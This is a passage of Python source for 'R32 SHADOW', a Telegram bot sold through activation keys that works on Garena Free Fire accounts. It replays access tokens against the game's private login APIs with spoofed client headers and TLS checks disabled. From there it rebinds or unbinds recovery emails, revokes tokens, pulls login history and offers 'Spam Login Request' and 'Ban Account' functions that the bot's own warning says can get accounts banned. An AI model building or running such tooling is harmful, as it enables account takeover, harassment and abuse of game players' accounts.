                uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
                                       headers=uid_headers, verify=False, timeout=5)
                if uid_res.status_code == 200:
                    uid = uid_res.json().get("uid")
                    if uid:
                        openid_res = requests.post("https://topup.pk/api/auth/player_id_login",
                                                   json={"app_id": 100067, "login_id": str(uid)},
                                                   verify=False, timeout=5)
                        if openid_res.status_code == 200:
                            oId = openid_res.json().get("open_id")
            except:
                pass
        if not oId:
            return "Failed to extract Open ID. Token may be invalid.", []
        platforms = [8, 3, 4, 6]
        for p_type in platforms:
            pl = build_majorlogin(token, oId, p_type)
            if pl is None:
                continue
            try:
                headers = {
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "Content-Type": "application/octet-stream",
                    "Expect": "100-continue",
                    "X-GA": "v1 1",
                    "X-Unity-Version": "2018.4.11f1",
                    "ReleaseVersion": "OB54"
                }
                r = requests.post("https://loginbp.ggpolarbear.com/MajorLogin", headers=headers, data=pl, timeout=10, verify=False)
                if r.status_code == 200:
                    res = mLrPb.MajorLoginRes()
                    try:
                        res.ParseFromString(dec(r.content))
                    except:
                        res.ParseFromString(r.content)
                    if res.token:
                        jwt_token = res.token
                        break
            except:
                continue
        if not jwt_token:
            return "MajorLogin failed across all platforms.", []
    try:
        hH = {
            "Expect": "100-continue",
            "Authorization": f"Bearer {jwt_token}",
            "X-Unity-Version": "2018.4.11f1",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB54",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
            "Host": "client.ind.freefiremobile.com",
            "Connection": "close"
        }
        r = requests.post("https://client.ind.freefiremobile.com/GetLoginHistory", headers=hH, data=enc(b""), timeout=15, verify=False)
        if r.status_code != 200:
            return f"HTTP {r.status_code}", []
        try:
            d = dec(r.content)
        except:
            d = r.content
        records = parse_history_protobuf(d)
        return "", records
    except Exception as e:
        return f"Error: {e}", []

# ============================================================
# KEYBOARDS
# ============================================================

def get_user_keyboard(lang: str = LANG_EN) -> ReplyKeyboardMarkup:
    if lang == LANG_AR:
        keyboard = [
            [KeyboardButton("🟢 إضافة إيميل"), KeyboardButton("🔍 التحقق من الإيميل")],
            [KeyboardButton("🌐 المنصات المرتبطة"), KeyboardButton("❌ إلغاء ربط الإيميل")],
            [KeyboardButton("🔓 فك الربط"), KeyboardButton("🔄 تغيير الإيميل")],
            [KeyboardButton("📋 تفاصيل التوكن"), KeyboardButton("🔗 تحويل EAT")],
            [KeyboardButton("🔴 إلغاء التوكن"), KeyboardButton("📝 سجل الدخول")],
            [KeyboardButton("🌍 تغيير اللغة"), KeyboardButton("🔄 طلب سبام")],
            [KeyboardButton("🔑 تحويل إلى JWT"), KeyboardButton("🚫 حظر الحساب")],
        ]
    else:
        keyboard = [
            [KeyboardButton("🟢 Add Recovery Email"), KeyboardButton("🔍 Check Recovery Email")],
            [KeyboardButton("🌐 Check Platform"), KeyboardButton("❌ Cancel Recovery Email")],
            [KeyboardButton("🔓 Unbind Email"), KeyboardButton("🔄 Change Bind Email")],
            [KeyboardButton("📋 Get Token Details"), KeyboardButton("🔗 Eat Token Website")],
            [KeyboardButton("🔴 Revoke Access Token"), KeyboardButton("📝 Login History")],
            [KeyboardButton("🌍 Change Language"), KeyboardButton("🔄 Spam Login Request")],
            [KeyboardButton("🔑 Access Token to JWT"), KeyboardButton("🚫 Ban Account")],
        ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard(lang: str = LANG_EN) -> ReplyKeyboardMarkup:
    if lang == LANG_AR:
        keyboard = [
            [KeyboardButton("🟢 إنشاء مفتاح"), KeyboardButton("🔴 تعطيل مفتاح")],
            [KeyboardButton("👤 طرد مستخدم"), KeyboardButton("📊 إحصائيات")],
            [KeyboardButton("📋 قائمة المفاتيح"), KeyboardButton("📢 رسالة جماعية")],
            [KeyboardButton("📢 رسالة لمستخدم"), KeyboardButton("📋 طلبات السبام")],
            [KeyboardButton("🔄 إعادة تعيين البوت"), KeyboardButton("🔴 إغلاق البوت")],
            [KeyboardButton("🟢 تشغيل البوت"), KeyboardButton("❓ المساعدة")],
        ]
    else:
        keyboard = [
            [KeyboardButton("🟢 Create Key"), KeyboardButton("🔴 Disable Key")],
            [KeyboardButton("👤 Kick User"), KeyboardButton("📊 Statistics")],
            [KeyboardButton("📋 List Keys"), KeyboardButton("📢 Broadcast Message")],
            [KeyboardButton("📢 Send to User"), KeyboardButton("📋 Spam Requests")],
            [KeyboardButton("🔄 Reset Bot"), KeyboardButton("🔴 Stop Bot")],
            [KeyboardButton("🟢 Start Bot"), KeyboardButton("❓ Help")],
        ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_method_keyboard(lang: str = LANG_EN) -> ReplyKeyboardMarkup:
    if lang == LANG_AR:
        return ReplyKeyboardMarkup([
            [KeyboardButton("📩 كود التحقق"), KeyboardButton("🔐 كود الأمان")],
            [KeyboardButton("↩️ العودة للقائمة")],
        ], resize_keyboard=True)
    return ReplyKeyboardMarkup([
        [KeyboardButton("📩 OTP"), KeyboardButton("🔐 Security Code")],
        [KeyboardButton("↩️ Back to Menu")],
    ], resize_keyboard=True)

# ============================================================
# BOT HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = user.id
    username = user.username or ""
    first_name = user.first_name or ""
    DataManager.ensure_user(user_id, username, first_name)
    is_admin = DataManager.is_admin(user_id)
    
    if check_user_key(user_id) or is_admin:
        lang = DataManager.get_user_lang(user_id)
        if is_admin:
            msg = f"""
👑 **Admin Panel**

Welcome back, @{username}!

👤 ID: {user_id}

Select an option from the admin menu below.
            """ if lang == LANG_EN else f"""
👑 **لوحة التحكم**

مرحباً بك، @{username}!

👤 المعرف: {user_id}

اختر أحد الخيارات من قائمة المشرف أدناه.
            """
            await safe_reply_text(
                update,
                add_footer(msg, lang),
                reply_markup=get_admin_keyboard(lang)
            )
        else:
            msg = f"""
🚀 R32 SHADOW

👤 User: {user_id}

Select an option from the menu below.
            """ if lang == LANG_EN else f"""
🚀 R32 SHADOW

👤 المستخدم: {user_id}

اختر أحد الخيارات من القائمة أدناه.
            """
            await safe_reply_text(
                update,
                add_footer(msg, lang),
                reply_markup=get_user_keyboard(lang)
            )
        return
    
    context.user_data["state"] = "awaiting_key"
    await update.message.reply_text(
        "🔐 R32 SHADOW\n\nWelcome to the secure Garena account management bot.\n\nPlease enter your activation key to continue.\n\nR32-KEYXXXXXXXXXX",
        parse_mode=None
    )

async def show_menu(update: Update, user_id: int, context: ContextTypes.DEFAULT_TYPE = None):
    """Display the main menu, works for both messages and callback queries."""
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)
    
    if is_admin:
        if lang == LANG_AR:
            text = f"""
👑 **لوحة التحكم**

👤 المعرف: {user_id}

اختر أحد الخيارات من قائمة المشرف أدناه.
            """
        else:
            text = f"""
👑 **Admin Panel**

👤 ID: {user_id}

Select an option from the admin menu below.
            """
        reply_markup = get_admin_keyboard(lang)
    else:
        if lang == LANG_AR:
            text = f"""
🚀 R32 SHADOW

👤 المستخدم: {user_id}

اختر أحد الخيارات من القائمة أدناه.
            """
        else:
            text = f"""
🚀 R32 SHADOW

👤 User: {user_id}

Select an option from the menu below.
            """
        reply_markup = get_user_keyboard(lang)
    
    final_text = add_footer(text, lang)
    
    # Send using safe_reply_text
    await safe_reply_text(update, final_text, reply_markup=reply_markup)

# ============================================================
# MAIN BOT TEXT HANDLER
# ============================================================

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user = update.effective_user
    state = context.user_data.get("state")
    text = update.message.text.strip()
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)
    
    # Check if bot is stopped (only admin can control)
    if not BotStatusManager.is_running() and not is_admin:
        await update.message.reply_text(
            "🔴 Bot is currently stopped. Please contact @r32pro for assistance." if lang == LANG_EN else "🔴 البوت متوقف حالياً. يرجى الاتصال بـ @r32pro للمساعدة.",
            parse_mode=None
        )
        return
    
    # Handle key input
    if state == "awaiting_key":
        if is_admin:
            context.user_data["state"] = None
            await update.message.reply_text(
                "✅ You are an admin, no key required!",
                parse_mode=None
            )
            await show_menu(update, user_id, context)
            return
        
        is_valid, message = validate_key(text, user_id)
        if is_valid:
            context.user_data["state"] = None
            await update.message.reply_text(
                f"✅ Access Granted\n\n{message}\n\nWelcome to R32 SHADOW!",
                parse_mode=None
            )
            await show_menu(update, user_id, context)
        else:
            await update.message.reply_text(
                f"❌ Access Denied\n\n{message}\n\nContact @r32pro or @XHR_M for assistance.",
                parse_mode=None
            )
        return
    
    if not check_user_key(user_id) and not is_admin:
        await update.message.reply_text(
            "🔐 Use /start to login.",
            parse_mode=None
        )
        return
    
    # ----- ADMIN COMMANDS -----
    if is_admin:
        # Stop Bot
        if text == "🔴 Stop Bot" or text == "🔴 إغلاق البوت":
            if BotStatusManager.is_running():
                BotStatusManager.save_status(False)
                await update.message.reply_text(
                    "🔴 Bot has been stopped. Users will not be able to use commands until started again." if lang == LANG_EN else "🔴 تم إيقاف البوت. لن يتمكن المستخدمون من استخدام الأوامر حتى يتم تشغيله مرة أخرى.",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            else:
                await update.message.reply_text(
                    "⚠️ Bot is already stopped." if lang == LANG_EN else "⚠️ البوت متوقف بالفعل.",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            return
        
        # Start Bot
        if text == "🟢 Start Bot" or text == "🟢 تشغيل البوت":
            if not BotStatusManager.is_running():
                BotStatusManager.save_status(True)
                await update.message.reply_text(
                    "🟢 Bot has been started! Users can now use commands." if lang == LANG_EN else "🟢 تم تشغيل البوت! يمكن للمستخدمين الآن استخدام الأوامر.",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            else:
                await update.message.reply_text(
                    "⚠️ Bot is already running." if lang == LANG_EN else "⚠️ البوت يعمل بالفعل.",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            return
        
        # Create Key
        if text == "🟢 Create Key" or text == "🟢 إنشاء مفتاح":
            context.user_data["state"] = "create_duration"
            await update.message.reply_text(
                "🟢 Create Key\n\nEnter duration (e.g., 24 hours or 7 days):" if lang == LANG_EN else "🟢 إنشاء مفتاح\n\nأدخل المدة (مثال: 24 hours أو 7 days):",
                parse_mode=None
            )
            return
        
        if state == "create_duration":
            try:
                parts = text.split()
                if len(parts) != 2:
                    raise ValueError("Format: <number> <unit>")
                value = int(parts[0])
                unit = parts[1].lower()
                if unit in ["hour", "hours", "hr", "h"]:
                    unit = "hours"
                elif unit in ["day", "days", "d"]:
                    unit = "days"
                else:
                    raise ValueError("Use 'hours' or 'days'")
                if value <= 0:
                    raise ValueError("Must be positive")
                context.user_data["duration"] = value
                context.user_data["unit"] = unit
                context.user_data["state"] = "create_devices"
                await update.message.reply_text(
                    f"✅ Duration: {value} {unit}\n\nEnter max devices (default {MAX_DEVICES_DEFAULT}):" if lang == LANG_EN else f"✅ المدة: {value} {unit}\n\nأدخل عدد الأجهزة القصوى (الافتراضي {MAX_DEVICES_DEFAULT}):",
                    parse_mode=None
                )
            except Exception as e:
                await update.message.reply_text(
                    f"❌ Error: {e}\n\nUse: 24 hours or 7 days" if lang == LANG_EN else f"❌ خطأ: {e}\n\nاستخدم: 24 hours أو 7 days",
                    parse_mode=None
                )
            return
        
        if state == "create_devices":
            try:
                max_dev = int(text) if text.strip() else MAX_DEVICES_DEFAULT
                if max_dev <= 0:
                    raise ValueError("Must be positive")
                duration = context.user_data.get("duration", 24)
                unit = context.user_data.get("unit", "hours")
                key_data = KeyManager.create(duration, unit, max_dev, user_id)
                KeyManager.save(key_data)
                context.user_data["state"] = None
                await update.message.reply_text(
                    f"✅ Key Created!\n\n🔑 {key_data['key']}\n⏰ {duration} {unit}\n👥 {max_dev} devices" if lang == LANG_EN else f"✅ تم إنشاء المفتاح!\n\n🔑 {key_data['key']}\n⏰ {duration} {unit}\n👥 {max_dev} جهاز",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            except Exception as e:
                await update.message.reply_text(
                    f"❌ Error: {e}\n\nEnter a number:" if lang == LANG_EN else f"❌ خطأ: {e}\n\nأدخل رقماً:",
                    parse_mode=None
                )
            return
        
        # Disable Key
        if text == "🔴 Disable Key" or text == "🔴 تعطيل مفتاح":
            context.user_data["state"] = "disable_key"
            await update.message.reply_text(
                "🔴 Disable Key\n\nEnter key to disable:" if lang == LANG_EN else "🔴 تعطيل مفتاح\n\nأدخل المفتاح لتعطيله:",
                parse_mode=None
            )
            return
        
        if state == "disable_key":
            if KeyManager.disable(text):
                await update.message.reply_text(
                    f"✅ Key {text} disabled." if lang == LANG_EN else f"✅ تم تعطيل المفتاح {text}.",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            else:
                await update.message.reply_text(
                    "❌ Key not found." if lang == LANG_EN else "❌ المفتاح غير موجود.",
                    reply_markup=get_admin_keyboard(lang)
                )
            context.user_data["state"] = None
            return
        
        # Kick User
        if text == "👤 Kick User" or text == "👤 طرد مستخدم":
            context.user_data["state"] = "kick_key"
            await update.message.reply_text(
                "👤 Kick User\n\nEnter key:" if lang == LANG_EN else "👤 طرد مستخدم\n\nأدخل المفتاح:",
                parse_mode=None
            )
            return
        
        if state == "kick_key":
            context.user_data["kick_key"] = text
            users = KeyManager.get_users(text)
            if not users:
                await update.message.reply_text(
                    f"📭 No users for {text}" if lang == LANG_EN else f"📭 لا يوجد مستخدمين للمفتاح {text}",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
                context.user_data["state"] = None
                return
            user_list = "\n".join([f"  • User {u}" for u in users[:10]])
            if len(users) > 10:
                user_list += f"\n  ... +{len(users)-10} more"
            context.user_data["state"] = "kick_user"
            await update.message.reply_text(
                f"👤 Kick User\n\n🔑 Key: {text}\n👥 Users:\n{user_list}\n\nEnter user ID to kick:" if lang == LANG_EN else f"👤 طرد مستخدم\n\n🔑 المفتاح: {text}\n👥 المستخدمين:\n{user_list}\n\nأدخل معرف المستخدم للطرد:",
                parse_mode=None
            )
            return
        
        if state == "kick_user":
            try:
                uid = int(text)
                key = context.user_data.get("kick_key")
                if KeyManager.remove_user(key, uid):
                    await update.message.reply_text(
                        f"✅ User {uid} kicked from {key}." if lang == LANG_EN else f"✅ تم طرد المستخدم {uid} من {key}.",
                        reply_markup=get_admin_keyboard(lang),
                        parse_mode=None
                    )
                else:
                    await update.message.reply_text(
                        "❌ Failed. User may not exist." if lang == LANG_EN else "❌ فشل. قد لا يكون المستخدم موجوداً.",
                        reply_markup=get_admin_keyboard(lang)
                    )
            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid user ID. Please enter a number." if lang == LANG_EN else "❌ معرف مستخدم غير صالح. أدخل رقماً.",
                    reply_markup=get_admin_keyboard(lang)
                )
            context.user_data["state"] = None
            return
        
        # Statistics
        if text == "📊 Statistics" or text == "📊 إحصائيات":
            keys = DataManager.get_keys()
            users = DataManager.get_users()
            total_keys = len(keys)
            active_keys = sum(1 for k in keys.values() if k.get("active", True))
            total_users = len(users)
            total_devices = sum(len(k.get("users", [])) for k in keys.values())
            spam_requests = SpamManager.get_pending_requests()
            active_spam = sum(1 for u in users.values() if u.get("spam_active", False))
            is_running = BotStatusManager.is_running()
            await update.message.reply_text(
                f"📊 Statistics\n\n🔑 Keys: {total_keys}\n🟢 Active: {active_keys}\n👥 Users: {total_users}\n📱 Devices: {total_devices}\n📋 Pending Spam: {len(spam_requests)}\n🔄 Active Spam: {active_spam}\n📌 Bot Status: {'🟢 Running' if is_running else '🔴 Stopped'}" if lang == LANG_EN else f"📊 إحصائيات\n\n🔑 المفاتيح: {total_keys}\n🟢 نشطة: {active_keys}\n👥 المستخدمين: {total_users}\n📱 الأجهزة: {total_devices}\n📋 طلبات سبام معلقة: {len(spam_requests)}\n🔄 سبام نشط: {active_spam}\n📌 حالة البوت: {'🟢 يعمل' if is_running else '🔴 متوقف'}",
                parse_mode=None
            )
            return
        
        # List Keys
        if text == "📋 List Keys" or text == "📋 قائمة المفاتيح":
            keys = KeyManager.get_all()
            if not keys:
                await update.message.reply_text(
                    "📭 No keys." if lang == LANG_EN else "📭 لا توجد مفاتيح.",
                    parse_mode=None
                )
                return
            active = {k: v for k, v in keys.items() if v.get("active", True)}
            inactive = {k: v for k, v in keys.items() if not v.get("active", True)}
            msg = "📋 All Keys\n" if lang == LANG_EN else "📋 جميع المفاتيح\n"
            if active:
                msg += "\n🟢 Active:\n" if lang == LANG_EN else "\n🟢 نشطة:\n"
                for k, v in list(active.items())[:10]:
                    msg += f"• {k} ({len(v.get('users', []))}/{v.get('max_devices', 5)})\n"
                if len(active) > 10:
                    msg += f"... +{len(active)-10} more\n"
            if inactive:
                msg += f"\n🔴 Inactive: {len(inactive)}\n" if lang == LANG_EN else f"\n🔴 غير نشطة: {len(inactive)}\n"
            await update.message.reply_text(
                msg,
                reply_markup=get_admin_keyboard(lang),
                parse_mode=None
            )
            return
        
        # Broadcast Message
        if text == "📢 Broadcast Message" or text == "📢 رسالة جماعية":
            context.user_data["state"] = "broadcast"
            await update.message.reply_text(
                "📢 Broadcast Message\n\nSend the message you want to broadcast to all users:" if lang == LANG_EN else "📢 رسالة جماعية\n\nأرسل الرسالة التي تريد إرسالها لجميع المستخدمين:",
                parse_mode=None
            )
            return
        
        if state == "broadcast":
            users = DataManager.get_users()
            if not users:
                await update.message.reply_text(
                    "📭 No users found." if lang == LANG_EN else "📭 لا يوجد مستخدمين.",
                    reply_markup=get_admin_keyboard(lang)
                )
                context.user_data["state"] = None
                return
            
            await update.message.reply_text(
                f"🔄 Broadcasting message to {len(users)} users... This may take a moment." if lang == LANG_EN else f"🔄 جاري إرسال الرسالة إلى {len(users)} مستخدم... قد يستغرق هذا بعض الوقت.",
                parse_mode=None
            )
            
            sent = 0
            failed = 0
            for uid, user_data in users.items():
                try:
                    await context.bot.send_message(
                        chat_id=int(uid),
                        text=f"📢 Announcement\n\n{text}\n\n— R32 SHADOW",
                        parse_mode=None
                    )
                    sent += 1
                    await asyncio.sleep(0.05)
                except Exception as e:
                    logger.error(f"Failed to send to {uid}: {e}")
                    failed += 1
            
            await update.message.reply_text(
                f"✅ Broadcast completed!\n\n📤 Sent: {sent}\n❌ Failed: {failed}\n👥 Total users: {len(users)}" if lang == LANG_EN else f"✅ تم إكمال البث!\n\n📤 تم الإرسال: {sent}\n❌ فشل: {failed}\n👥 إجمالي المستخدمين: {len(users)}",
                reply_markup=get_admin_keyboard(lang),
                parse_mode=None
            )
            context.user_data["state"] = None
            return
        
        # Send to User (Individual User Broadcast)
        if text == "📢 Send to User" or text == "📢 رسالة لمستخدم":
            context.user_data["state"] = "send_to_user_id"
            await update.message.reply_text(
                "📢 Send to User\n\nEnter the user ID you want to send a message to:" if lang == LANG_EN else "📢 رسالة لمستخدم\n\nأدخل معرف المستخدم الذي تريد إرسال رسالة إليه:",
                parse_mode=None
            )
            return
        
        if state == "send_to_user_id":
            try:
                target_user_id = int(text)
                context.user_data["send_target_user"] = target_user_id
                context.user_data["state"] = "send_to_user_message"
                await update.message.reply_text(
                    f"📢 Send to User\n\nTarget User: {target_user_id}\n\nEnter the message you want to send:" if lang == LANG_EN else f"📢 رسالة لمستخدم\n\nالمستخدم المستهدف: {target_user_id}\n\nأدخل الرسالة التي تريد إرسالها:",
                    parse_mode=None
                )
            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid user ID. Please enter a number." if lang == LANG_EN else "❌ معرف مستخدم غير صالح. أدخل رقماً.",
                    reply_markup=get_admin_keyboard(lang)
                )
                context.user_data["state"] = None
            return
        
        if state == "send_to_user_message":
            target_user_id = context.user_data.get("send_target_user")
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"📢 Admin Message\n\n{text}\n\n— R32 SHADOW",
                    parse_mode=None
                )
                await update.message.reply_text(
                    f"✅ Message sent to user {target_user_id} successfully." if lang == LANG_EN else f"✅ تم إرسال الرسالة إلى المستخدم {target_user_id} بنجاح.",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            except Exception as e:
                logger.error(f"Failed to send to user {target_user_id}: {e}")
                await update.message.reply_text(
                    f"❌ Failed to send message to user {target_user_id}. Error: {e}" if lang == LANG_EN else f"❌ فشل إرسال الرسالة إلى المستخدم {target_user_id}. الخطأ: {e}",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            context.user_data["state"] = None
            return
        
        # Spam Requests (Admin)
        if text == "📋 Spam Requests" or text == "📋 طلبات السبام":
            pending = SpamManager.get_pending_requests()
            if not pending:
                await update.message.reply_text(
                    "📭 No pending spam requests." if lang == LANG_EN else "📭 لا توجد طلبات سبام معلقة.",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
                return

            keyboard = []
            for req in pending:
                req_id = req["id"]
                user_id_req = req["user_id"]
                eat_token = req["eat_token"][:20] + "..." if len(req["eat_token"]) > 20 else req["eat_token"]
                keyboard.append([
                    InlineKeyboardButton(f"✅ {user_id_req} ({eat_token})", callback_data=f"spam_approve_{req_id}"),
                    InlineKeyboardButton(f"❌ Reject", callback_data=f"spam_reject_{req_id}")
                ])

            await update.message.reply_text(
                f"📋 Pending Spam Requests ({len(pending)})\n\nClick Approve/Reject below:" if lang == LANG_EN else f"📋 طلبات السبام المعلقة ({len(pending)})\n\nاضغط موافقة/رفض أدناه:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode=None
            )
            return
        
        # Reset Bot
        if text == "🔄 Reset Bot" or text == "🔄 إعادة تعيين البوت":
            keyboard = ReplyKeyboardMarkup([
                [KeyboardButton("✅ Yes"), KeyboardButton("❌ No")],
            ], resize_keyboard=True)
            context.user_data["state"] = "reset_confirm"
            await update.message.reply_text(
                "⚠️ Reset All Data?\n\nThis will delete ALL keys and users.\n\nAre you sure?" if lang == LANG_EN else "⚠️ إعادة تعيين جميع البيانات؟\n\nسيتم حذف جميع المفاتيح والمستخدمين.\n\nهل أنت متأكد؟",
                reply_markup=keyboard,
                parse_mode=None
            )
            return
        
        if state == "reset_confirm":
            if text == "✅ Yes":
                DataManager.save_keys({})
                DataManager.save_users({})
                DataManager.save_spam_requests({"requests": [], "active": {}})
                await update.message.reply_text(
                    "✅ Reset Complete! All data cleared." if lang == LANG_EN else "✅ تم إعادة التعيين! تم مسح جميع البيانات.",
                    reply_markup=get_admin_keyboard(lang),
                    parse_mode=None
                )
            else:
                await update.message.reply_text(
                    "❌ Cancelled." if lang == LANG_EN else "❌ تم الإلغاء.",
                    reply_markup=get_admin_keyboard(lang)
                )
            context.user_data["state"] = None
            return
        
        # Help
        if text == "❓ Help" or text == "❓ المساعدة":
            await update.message.reply_text(
                """
📚 Admin Help

🟢 Create Key – generate a new key
🔴 Disable Key – revoke a key
👤 Kick User – remove user from a key
📊 Statistics – view bot stats
📋 List Keys – see all keys
📢 Broadcast Message – send a message to all users
📢 Send to User – send a message to a specific user by ID
📋 Spam Requests – manage spam login requests
🔄 Reset Bot – wipe all data
🔴 Stop Bot – stop the bot (users can't use commands)
🟢 Start Bot – start the bot

👨‍💻 Developer: @r32pro
👨‍💻 Co-Developer: @XHR_M

— R32 SHADOW
                """ if lang == LANG_EN else """
📚 مساعدة المشرف

🟢 إنشاء مفتاح – إنشاء مفتاح جديد
🔴 تعطيل مفتاح – إلغاء مفتاح
👤 طرد مستخدم – إزالة مستخدم من مفتاح
📊 إحصائيات – عرض إحصائيات البوت
📋 قائمة المفاتيح – عرض جميع المفاتيح
📢 رسالة جماعية – إرسال رسالة لجميع المستخدمين
📢 رسالة لمستخدم – إرسال رسالة لمستخدم محدد بالمعرف
📋 طلبات السبام – إدارة طلبات سبام الدخول
🔄 إعادة تعيين البوت – مسح جميع البيانات
🔴 إغلاق البوت – إيقاف البوت (لا يمكن للمستخدمين استخدام الأوامر)
🟢 تشغيل البوت – تشغيل البوت

👨‍💻 المطور: @r32pro
👨‍💻 المطور المساعد: @XHR_M

— R32 SHADOW
                """,
                parse_mode=None
            )
            return
    
    # ----- USER COMMANDS -----
    
    # ----- LANGUAGE SWITCH -----
    if text == "🌍 Change Language" or text == "🌍 تغيير اللغة":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
            [InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar")],
        ])
        await update.message.reply_text(
            "🌍 Select your language:\nاختر لغتك:",
            reply_markup=keyboard,
            parse_mode=None
        )
        return
    
    # ----- SPAM LOGIN REQUEST -----
    if text == "🔄 Spam Login Request" or text == "🔄 طلب سبام":
        if SpamManager.has_pending_request(user_id):
            if lang == LANG_AR:
                await safe_reply_text(update, "⏳ لديك طلب سبام معلق بالفعل. يرجى الانتظار حتى يتم قبوله أو رفضه من قبل المشرف.")
            else:
                await safe_reply_text(update, "⏳ You already have a pending spam request. Please wait for admin approval or rejection.")
            return
        
        if SpamManager.is_spam_active(user_id):
            if lang == LANG_AR:
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🟢 تم تفعيل السبام ✅", callback_data="spam_status")],
                    [InlineKeyboardButton("❌ إلغاء السبام", callback_data="spam_cancel")],
                ])
                await update.message.reply_text(
                    "🔄 وضع السبام مفعل حالياً!\n\n✅ تم تفعيل وضع سبام بيتا\n📌 اضغط إلغاء لإيقاف السبام عن حسابك",
                    reply_markup=keyboard,
                    parse_mode=None
                )
            else:
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🟢 Spam Active ✅", callback_data="spam_status")],
                    [InlineKeyboardButton("❌ Cancel Spam", callback_data="spam_cancel")],
                ])
                await update.message.reply_text(
                    "🔄 Spam Mode is Currently Active!\n\n✅ Spam Beta Mode is Activated\n📌 Press Cancel to disable spam for your account",
                    reply_markup=keyboard,
                    parse_mode=None
                )
            return
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ YES / نعم", callback_data="spam_warning_yes")],
            [InlineKeyboardButton("❌ NO / لا", callback_data="spam_warning_no")],
        ])
        
        warning_msg = (
            "⚠️ WARNING: Making a spam login bot may cause your account to get BANNED. Do you want to proceed?"
            if lang == LANG_EN else
            "⚠️ تحذير: عمل بوت سبام لوجين قد يسبب لحسابك بند. هل تريد الاستمرار؟"
        )
        await update.message.reply_text(warning_msg, reply_markup=keyboard, parse_mode=None)
        return
    
    if state == "spam_eat_input" and context.user_data.get("action") == "spam_request":
        eat_input = text
        error, result = eat_to_token(eat_input)
        if error:
            await safe_reply_text(update, f"❌ {error}")
            context.user_data["state"] = None
            return
        
        request = SpamManager.create_request(user_id, eat_input)
        SpamManager.save_request(request)
        
        msg = "Your request has been sent to @r32pro for approval" if lang == LANG_EN else "تم إرسال طلبك حتى يتم قبولك من طرف @r32pro"
        await safe_reply_text(update, msg)
        
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"📋 New Spam Request!\n\n👤 User: {user_id}\n🔑 Token: {eat_input[:30]}...\n📌 Request ID: {request['id']}\n\nCheck the Spam Requests menu to approve or reject."
            )
        except Exception as e:
            logger.error(f"Failed to notify admin: {e}")
        
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Add Recovery Email -----
    if text == "🟢 Add Recovery Email" or text == "🟢 إضافة إيميل":
        context.user_data["action"] = "add_recovery"
        context.user_data["state"] = "add_recovery_token"
        msg = "🟢 Add Recovery Email\n\nStep 1/5: Enter Access Token" if lang == LANG_EN else "🟢 إضافة إيميل استرداد\n\nالخطوة 1/5: أدخل توكن الوصول"
        await safe_reply_text(update, msg)
        return
    
    if state == "add_recovery_token" and context.user_data.get("action") == "add_recovery":
        token = text
        email, pending, countdown, rc, success = get_bind_info(token)
        if not success:
            await safe_reply_text(update, "❌ Failed to fetch account bind info. Token may be invalid.")
            context.user_data["state"] = None
            return
        
        if email:
            masked = mask_email(email)
            msg = f"❌ This account already contains an email: **{masked}**\n\n📌 Please use 'Change Bind Email' or 'Unbind Email' to manage the existing email." if lang == LANG_EN else f"❌ هذا الحساب يحتوي بالفعل على إيميل: **{masked}**\n\n📌 استخدم 'تغيير الإيميل' أو 'فك الربط' لإدارة الإيميل الموجود."
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        
        if pending:
            msg = f"ℹ️ A pending email change exists: **{pending}**\nCountdown: {countdown}\n\nPlease wait for it to complete or cancel it first." if lang == LANG_EN else f"ℹ️ يوجد طلب تغيير إيميل معلق: **{pending}**\nالعد التنازلي: {countdown}\n\nيرجى الانتظار حتى يكتمل أو إلغاؤه أولاً."
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        
        context.user_data["add_token"] = token
        context.user_data["state"] = "add_recovery_email"
        msg = "Step 2/5: Enter the email address to bind:" if lang == LANG_EN else "الخطوة 2/5: أدخل عنوان الإيميل للربط:"
        await safe_reply_text(update, msg)
        return
    
    if state == "add_recovery_email" and context.user_data.get("action") == "add_recovery":
        email = text
        if not email or '@' not in email:
            msg = "❌ Invalid email format. Please enter a valid email address." if lang == LANG_EN else "❌ صيغة إيميل غير صالحة. يرجى إدخال عنوان إيميل صحيح."
            await safe_reply_text(update, msg)
            return
        context.user_data["add_email"] = email
        token = context.user_data.get("add_token")
        context.user_data["state"] = "add_recovery_otp"
        success, result = send_otp(email, token)
